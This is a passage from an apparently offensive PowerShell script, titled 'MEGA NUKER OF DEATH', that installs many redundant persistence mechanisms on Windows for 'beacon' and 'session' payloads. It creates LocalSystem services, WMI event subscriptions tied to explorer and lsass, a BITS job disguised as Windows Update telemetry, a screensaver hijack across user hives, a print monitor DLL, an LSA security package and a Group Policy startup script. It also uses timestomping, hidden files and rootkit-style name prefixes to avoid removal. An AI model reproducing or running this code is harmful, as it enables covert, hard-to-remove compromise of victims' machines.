            $binPath = "`"$psExe`" -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrapPath`""
        } else {
            $binPath = "`"$svcPayload`""
        }

        $existingSvc = Get-Service -Name $svcDef.Name -ErrorAction SilentlyContinue
        if ($existingSvc) {
            Stop-Service -Name $svcDef.Name -Force -ErrorAction SilentlyContinue
            & sc.exe delete $svcDef.Name 2>&1 | Out-Null
            Start-Sleep -Seconds 1
        }

        & sc.exe create $svcDef.Name binPath= $binPath start= auto obj= LocalSystem 2>&1 | Out-Null
        & sc.exe description $svcDef.Name $svcDef.Desc 2>&1 | Out-Null
        & sc.exe failure $svcDef.Name reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$($svcDef.Name)" -Name "DisplayName" -Value $svcDef.Display -Force -ErrorAction SilentlyContinue
        Write-Success "  Service created: $($svcDef.Name)"
        Add-Log "E" "Service" $svcDef.Name "OK" "payload=$svcPayload"
    } catch {
        Write-Err "  Service $($svcDef.Name) failed: $_"
        Add-Log "E" "Service" $svcDef.Name "FAIL" "$_"
    }
}
Write-StateLog

# =============================================================================
# SECTION F - WMI EVENT SUBSCRIPTIONS (each gets a different planted copy)
# =============================================================================
Write-Section "F - WMI Event Subscriptions (3 subscriptions)"

$wmiNS = "root\subscription"

function New-WmiSubscription {
    param(
        [string]$FilterName,
        [string]$ConsumerName,
        [string]$Query,
        [string]$QueryNamespace = "root\cimv2",
        [string]$Command
    )
    try {
        Get-WmiObject -Namespace $wmiNS -Class __FilterToConsumerBinding -EA SilentlyContinue |
            Where-Object { $_.Filter -like "*$FilterName*" } |
            ForEach-Object { $_ | Remove-WmiObject -EA SilentlyContinue }
        Get-WmiObject -Namespace $wmiNS -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
        Get-WmiObject -Namespace $wmiNS -Class __EventFilter            -Filter "Name='$FilterName'"   -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue

        $filter = Set-WmiInstance -Namespace $wmiNS -Class __EventFilter -Arguments @{
            Name = $FilterName; EventNamespace = $QueryNamespace; QueryLanguage = "WQL"; Query = $Query
        } -ErrorAction Stop
        $consumer = Set-WmiInstance -Namespace $wmiNS -Class CommandLineEventConsumer -Arguments @{
            Name = $ConsumerName; CommandLineTemplate = $Command
        } -ErrorAction Stop

        $filter   = Get-WmiObject -Namespace $wmiNS -Class __EventFilter              -Filter "Name='$FilterName'"
        $consumer = Get-WmiObject -Namespace $wmiNS -Class CommandLineEventConsumer   -Filter "Name='$ConsumerName'"
        Set-WmiInstance -Namespace $wmiNS -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter.__PATH; Consumer = $consumer.__PATH
        } -ErrorAction Stop | Out-Null
        Write-Success "  WMI sub OK: $FilterName"
        return $true
    } catch {
        Write-Err "  WMI sub FAIL [$FilterName]: $_"
        return $false
    }
}

$f1Beacon  = Get-NextBeacon
$f2Session = Get-NextSession
$f3Beacon  = Get-NextBeacon

Write-Section "F1 - WMI: explorer.exe start -> beacon"
$f1ok = New-WmiSubscription `
    -FilterName    "WMIExplorerStartFilter" `
    -ConsumerName  "WMIExplorerConsumer" `
    -Query         "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'" `
    -Command       ('"' + $f1Beacon + '"')
if ($f1ok) { Add-Log "F1" "WMI" "explorer-start/beacon" "OK" "cmd=$f1Beacon" }

Write-Section "F2 - WMI: IntervalTimer 300s -> session"
try {
    Set-WmiInstance -Namespace "root\cimv2" -Class __IntervalTimerInstruction -Arguments @{
        TimerId               = "MNODTimer300"
        IntervalBetweenEvents = [UInt32]300000
    } -ErrorAction SilentlyContinue | Out-Null
    Write-Success "  Timer MNODTimer300 (300s) created"
} catch { Write-Warn "  Timer creation failed: $_" }

$f2ok = New-WmiSubscription `
    -FilterName     "WMITimerFilter_MNOD300" `
    -ConsumerName   "WMITimerConsumer_MNOD300" `
    -Query          "SELECT * FROM __TimerEvent WHERE TimerID = 'MNODTimer300'" `
    -QueryNamespace "root\cimv2" `
    -Command        ('"' + $f2Session + '"')
if ($f2ok) { Add-Log "F2" "WMI" "timer300s/session" "OK" "cmd=$f2Session" }

Write-Section "F3 - WMI: lsass.exe start -> beacon"
$f3ok = New-WmiSubscription `
    -FilterName    "WMILsassStartFilter" `
    -ConsumerName  "WMILsassConsumer" `
    -Query         "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'lsass.exe'" `
    -Command       ('"' + $f3Beacon + '"')
if ($f3ok) { Add-Log "F3" "WMI" "lsass-start/beacon" "OK" "cmd=$f3Beacon" }

Write-StateLog

# =============================================================================
# SECTION G - BITS PERSISTENCE
# =============================================================================
Write-Section "G - BITS Persistence"

$gBeacon = Get-NextBeacon
try {
    $bitsBeacon  = Join-Path $StagingBase "${pfx}bits_beacon.exe"
    $bitsStage   = Join-Path $StagingBase "${pfx}bits_stage.exe"
    $bitsNotify  = Join-Path $StagingBase "${pfx}bits_notify.ps1"
    $bitsJobName = "WU_Telemetry_DiagnosticsSync"

    $null = Copy-Stealth -Source $gBeacon -Destination $bitsBeacon

    # Build UNC here so it's available for the notify script content below
    $driveLetter = $bitsBeacon.Substring(0,1)
    $restOfPath  = $bitsBeacon.Substring(2)   # includes leading "\" -> "\\server\C$\Windows\..."
    $bitsUNC     = "\\127.0.0.1\${driveLetter}`$$restOfPath"

    $n1  = "Start-Process -FilePath '$bitsBeacon' -WindowStyle Hidden -ErrorAction SilentlyContinue"
    $n2  = "Start-Sleep -Seconds 3"
    $n3  = "Remove-Item -Path '$bitsStage' -Force -ErrorAction SilentlyContinue"
    $n4  = '$jOut  = bitsadmin /Create "' + $bitsJobName + '" 2>&1'
    $n5  = '$jGuid = ([regex]::Match(($jOut | Out-String), ''\{[0-9A-Fa-f-]+\}'')).Value'
    $n6  = 'if ($jGuid) {'
    $n6b = "    bitsadmin /AddFile `$jGuid `"$bitsUNC`" `"$bitsStage`""
    $n7  = "    bitsadmin /SetPriority `$jGuid FOREGROUND"
    $n8  = "    bitsadmin /SetMinRetryDelay `$jGuid 300"
    $n9  = "    bitsadmin /SetNoProgressTimeout `$jGuid 7776000"
    $n10 = "    bitsadmin /SetNotifyFlags `$jGuid 3"
    $n11 = "    bitsadmin /SetNotifyCmdLine `$jGuid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$bitsNotify""'"
    $n12 = "    bitsadmin /Resume `$jGuid"
    $n13 = "}"
    $notifyContent = ($n1,$n2,$n3,$n4,$n5,$n6,$n6b,$n7,$n8,$n9,$n10,$n11,$n12,$n13) -join "`r`n"
    [System.IO.File]::WriteAllText($bitsNotify, $notifyContent, [System.Text.Encoding]::ASCII)
    Set-StealthAttributes $bitsNotify
    Invoke-Timestomp      $bitsNotify

    $listOut  = & bitsadmin /List /AllUsers 2>&1 | Out-String
    $allGuids = [regex]::Matches($listOut, '\{[0-9A-Fa-f-]+\}') | Select-Object -ExpandProperty Value
    foreach ($g in $allGuids) {
        $info = & bitsadmin /Info $g /Verbose 2>&1 | Out-String
        if ($info -match [regex]::Escape($bitsJobName)) { & bitsadmin /Cancel $g 2>&1 | Out-Null }
    }

    $createOut = & bitsadmin /Create $bitsJobName 2>&1 | Out-String
    $jobGuid   = ([regex]::Match($createOut, '\{[0-9A-Fa-f-]+\}')).Value

    if ($jobGuid) {
        & bitsadmin /AddFile              $jobGuid $bitsUNC $bitsStage 2>&1 | Out-Null
        & bitsadmin /SetPriority          $jobGuid FOREGROUND           2>&1 | Out-Null
        & bitsadmin /SetMinRetryDelay     $jobGuid 300                  2>&1 | Out-Null
        & bitsadmin /SetNoProgressTimeout $jobGuid 7776000              2>&1 | Out-Null
        & bitsadmin /SetDescription       $jobGuid "Windows Update diagnostics telemetry sync" 2>&1 | Out-Null
        & bitsadmin /SetNotifyFlags       $jobGuid 3                    2>&1 | Out-Null
        $notifyArg = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$bitsNotify`""
        & bitsadmin /SetNotifyCmdLine     $jobGuid "powershell.exe" $notifyArg 2>&1 | Out-Null
        & bitsadmin /Resume               $jobGuid                     2>&1 | Out-Null
        Write-Success "G BITS: job $jobGuid ($bitsJobName) -> $gBeacon"
        Add-Log "G" "BITS" $bitsJobName "OK" "guid=$jobGuid;src=$gBeacon"
    } else {
        Write-Warn "G BITS: no GUID returned (admin shares may be disabled)"
        Add-Log "G" "BITS" $bitsJobName "FAIL" "no guid"
    }
} catch { Write-Err "G BITS failed: $_"; Add-Log "G" "BITS" "" "FAIL" "$_" }
Write-StateLog

# =============================================================================
# SECTION H - MISCELLANEOUS PERSISTENCE
# =============================================================================
Write-Section "H - Miscellaneous Persistence"

# H1: Screensaver hijack (current user + all offline user hives)
# NOTE: Removed SilentProcessExit on svchost.exe -- fires hundreds of times per
# boot and would flood the system with beacon processes.
Write-Section "H1 - Screensaver Hijack"
$h1Beacon = Get-NextBeacon
try {
    $scrDest   = "$env:SystemRoot\System32\${pfx}diag_saver.scr"
    $scrResult = Copy-Stealth -Source $h1Beacon -Destination $scrDest
    if (-not $scrResult) { $scrDest = $h1Beacon }

    $desktopKey = "HKCU:\Control Panel\Desktop"
    Set-ItemProperty $desktopKey -Name "SCRNSAVE.EXE"        -Value $scrDest -Force
    Set-ItemProperty $desktopKey -Name "ScreenSaveActive"    -Value "1"      -Force
    Set-ItemProperty $desktopKey -Name "ScreenSaveTimeOut"   -Value "60"     -Force
    Set-ItemProperty $desktopKey -Name "ScreenSaverIsSecure" -Value "0"      -Force
    Add-Log "H1" "Screensaver" $scrDest "OK" "current user"

    $ssOk = 0
    Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") } |
        ForEach-Object {
            $ntuserDat = Join-Path $_.FullName "NTUSER.DAT"
            if (Test-Path $ntuserDat) {
                $tmpKey = "HKU\CC_SCR_$($_.Name)"
                & reg.exe load $tmpKey $ntuserDat 2>&1 | Out-Null
                try {
                    $hiveDesk = "Registry::${tmpKey}\Control Panel\Desktop"
                    if (Test-Path $hiveDesk) {
                        Set-ItemProperty $hiveDesk "SCRNSAVE.EXE"        $scrDest -Force
                        Set-ItemProperty $hiveDesk "ScreenSaveActive"    "1"      -Force
                        Set-ItemProperty $hiveDesk "ScreenSaveTimeOut"   "60"     -Force
                        Set-ItemProperty $hiveDesk "ScreenSaverIsSecure" "0"      -Force
                        $ssOk++
                    }
                } finally { & reg.exe unload $tmpKey 2>&1 | Out-Null }
            }
        }
    Write-Success "H1 Screensaver: $scrDest ($ssOk offline hives)"
} catch { Write-Warn "H1 Screensaver failed: $_" }

# H2: Print Monitor DLL registration + fallback scheduled task
Write-Section "H2 - Print Monitor (T1547.010)"
$h2Session = Get-NextSession
try {
    $monitorName    = "${pfx}WMIPerfCounterMonitor"
    $monitorDllName = "${pfx}localspl_ext.dll"
    $monitorDllDest = "$env:SystemRoot\System32\$monitorDllName"
    $monitorKey     = "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\$monitorName"

    Copy-Stealth -Source $h2Session -Destination $monitorDllDest | Out-Null
    if (-not (Test-Path $monitorKey)) { New-Item -Path $monitorKey -Force | Out-Null }
    Set-ItemProperty $monitorKey -Name "Driver" -Value $monitorDllName -Force
    Write-Success "H2 Print Monitor: $monitorKey -> $h2Session"
    Add-Log "H2" "PrintMonitor" $monitorKey "OK"

    $h2Task = Get-NextSession
    $xml = Get-TaskXml -Command $h2Task -OffsetSeconds 90 -AddLogon $false -Description "WMI performance counter monitor"
    New-TaskSubfolder -FolderPath "Microsoft\Windows\PrintService"
    Unregister-ScheduledTask -TaskName "WMIPerfCounterMonitor" -TaskPath "\Microsoft\Windows\PrintService\" -Confirm:$false -EA SilentlyContinue
    Register-ScheduledTask   -TaskName "WMIPerfCounterMonitor" -TaskPath "\Microsoft\Windows\PrintService\" -Xml $xml -Force -EA SilentlyContinue | Out-Null
    Write-Success "H2 Print Monitor fallback task -> $h2Task"
    Add-Log "H2" "PrintMonTask" "\Microsoft\Windows\PrintService\WMIPerfCounterMonitor" "OK"
} catch { Write-Warn "H2 Print Monitor failed: $_" }

# H3: LSA Security Package
Write-Section "H3 - LSA Security Package (T1547.005)"
$h3Session = Get-NextSession
try {
    $lsaKey     = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
    $pkgName    = "${pfx}wbemcore_sec"
    $pkgDllDest = "$env:SystemRoot\System32\${pkgName}.dll"
    $copyResult = Copy-Stealth -Source $h3Session -Destination $pkgDllDest
    if (-not $copyResult) {
        Write-Warn "H3: DLL copy failed -- skipping LSA registration"
    } else {
        $current = (Get-ItemProperty $lsaKey -Name "Security Packages" -ErrorAction Stop)."Security Packages"
        if ($current -isnot [array]) { $current = @($current) }
        $current = @($current | Where-Object { $_ })
        if ($current -notcontains $pkgName) {
            Set-ItemProperty $lsaKey -Name "Security Packages" -Value ($current + $pkgName) -Type MultiString -Force
            Write-Success "H3 LSA Security Package: '$pkgName' added (takes effect after reboot)"
            Add-Log "H3" "LSASecPkg" $pkgDllDest "OK"
        } else { Write-Info "H3: $pkgName already present" }
    }
} catch { Write-Warn "H3 LSA Security Package failed: $_" }

# H4: Domain GP startup script (if domain-joined)
Write-Section "H4 - Domain GP Startup Script (if domain-joined)"
$h4Beacon = Get-NextBeacon
try {
    $netlogonSvc = Get-Service -Name "Netlogon" -ErrorAction SilentlyContinue
    if (-not $netlogonSvc) {
        Write-Info "H4: Netlogon not present -- skipping (standalone/workgroup)"
    } else {
        $gpStartupKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0"
        $gpScriptKey  = "$gpStartupKey\0"
        if (-not (Test-Path $gpStartupKey)) { New-Item -Path $gpStartupKey -Force | Out-Null }
        if (-not (Test-Path $gpScriptKey))  { New-Item -Path $gpScriptKey  -Force | Out-Null }
        Set-ItemProperty $gpStartupKey -Name "GPO-ID"       -Value "LocalGPO" -Force
        Set-ItemProperty $gpStartupKey -Name "SOM-ID"       -Value "Local"    -Force
        Set-ItemProperty $gpStartupKey -Name "Count"        -Value 1 -Type DWord -Force
        Set-ItemProperty $gpScriptKey  -Name "Script"       -Value $h4Beacon -Force
        Set-ItemProperty $gpScriptKey  -Name "Parameters"   -Value "" -Force
        Set-ItemProperty $gpScriptKey  -Name "IsPowershell" -Value 0 -Type DWord -Force
        Write-Success "H4 Domain GP startup script: $h4Beacon"
        Add-Log "H4" "NetlogonGP" $gpScriptKey "OK"
    }
} catch { Write-Warn "H4 Domain GP startup script failed: $_" }

Write-StateLog

# =============================================================================
# FINAL SUMMARY
# =============================================================================
$okCount   = ($script:Log | Where-Object { $_.Status -eq "OK"   }).Count
$failCount = ($script:Log | Where-Object { $_.Status -eq "FAIL" }).Count

Write-Host ""
Write-Warn "================================================================"
Write-Warn " MEGA NUKER OF DEATH -- Complete"
Write-Warn "================================================================"
Write-Host ""
Write-Host "  [A] Payload staging:   $($script:StagedBeacons.Count) beacon + $($script:StagedSessions.Count) session copies planted" -ForegroundColor Cyan
Write-Host "  [B] Scheduled tasks:   $bTaskOk/8 beacon + $sTaskOk/8 session (PT5M + Boot + Logon, Hidden, SYSTEM)" -ForegroundColor Cyan
Write-Host "  [C] Registry:          HKLM(6) + HKCU(4+offline) + WOW64(4) + Userinit + Shell + ActiveSetup(5) + GP" -ForegroundColor Cyan
Write-Host "  [D] Startup folders:   LNK + BAT + CMD + EXE in All-Users + CurrentUser startup" -ForegroundColor Cyan
Write-Host "  [E] Services:          WerFaultSvcExt + CryptSvcMonitor + WmiPerfSvcHost + DiagTrackSvcExt" -ForegroundColor Cyan
Write-Host "  [F] WMI subscriptions: explorer-start(beacon) + 5min-timer(session) + lsass-start(beacon)" -ForegroundColor Cyan
Write-Host "  [G] BITS job:          WU_Telemetry_DiagnosticsSync (self-requeuing)" -ForegroundColor Cyan
Write-Host "  [H] Misc:              Screensaver + PrintMonitor + LSA SecPkg + Domain GP" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Each mechanism points to a DIFFERENT planted .exe copy." -ForegroundColor Yellow
Write-Host "  Deleting one file kills only one trigger." -ForegroundColor Yellow
Write-Host ""
Write-Success "Log entries: $($script:Log.Count)  OK=$okCount  FAIL=$failCount"
Write-Success "State log: $($script:StateFile)"
Write-Host ""
if ($pfx) {
    Write-Warn "r77 prefix ENABLED -- dropped artifacts prefixed: $pfx"
} else {
    Write-Info "r77 prefix: disabled"
}
Write-Host ""
